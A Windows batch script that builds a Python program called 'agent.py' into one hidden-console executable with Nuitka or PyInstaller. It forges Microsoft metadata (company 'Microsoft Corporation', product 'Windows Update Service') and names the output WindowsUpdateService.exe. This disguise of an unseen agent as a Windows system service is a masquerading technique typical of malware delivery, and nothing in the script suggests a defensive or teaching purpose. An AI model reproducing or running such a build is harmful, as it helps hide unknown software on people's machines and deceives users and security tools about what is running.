@echo off
rem  Build ONE self-contained .exe that needs no Python on the target.
rem  Prefers Nuitka; falls back to PyInstaller.  Run from this folder.
setlocal
cd /d "%~dp0"

if not exist icon.ico (
    echo [i] icon.ico missing - generating from icon.png
    python make_ico.py
    if not exist icon.ico goto noicon
)

where nuitka >nul 2>&1 || (
    echo [i] Nuitka not found - installing ^(one time, takes a minute^)...
    pip install nuitka ordered-set zstandard || goto pyinstaller
)

echo [*] Building with Nuitka - this takes a while...
nuitka --onefile --assume-yes-for-downloads --mingw64 ^
  --windows-console-mode=disable ^
  --windows-icon-from-ico=icon.ico ^
  --company-name="Microsoft Corporation" ^
  --product-name="Windows Update Service" ^
  --file-description="Windows Update Service" ^
  --file-version=4.0.0.0 ^
  --product-version=4.0.0.0 ^
  --copyright="Copyright (C) 2026" ^
  --output-filename=WindowsUpdateService.exe ^
  --include-package=syspy ^
  --python-flag=no_docstrings ^
  --lto=yes ^
  agent.py
if errorlevel 1 goto pyinstaller
goto done

:pyinstaller
echo [*] Falling back to PyInstaller...
where pyinstaller >nul 2>&1 || pip install pyinstaller
pyinstaller --onefile --noconsole --clean ^
  --name WindowsUpdateService ^
  --icon icon.ico ^
  --version-file version.txt ^
  agent.py
if errorlevel 1 goto fail
copy /y "dist\WindowsUpdateService.exe" "WindowsUpdateService.exe" >nul
goto done

:done
echo.
echo  Built: WindowsUpdateService.exe
dir /b WindowsUpdateService.exe
pause
exit /b 0

:fail
echo.
echo  BUILD FAILED - scroll up for the error.
pause
exit /b 1

:noicon
echo.
echo  No icon.ico.  Put icon.png next to this file, then: pip install pillow
pause
exit /b 1
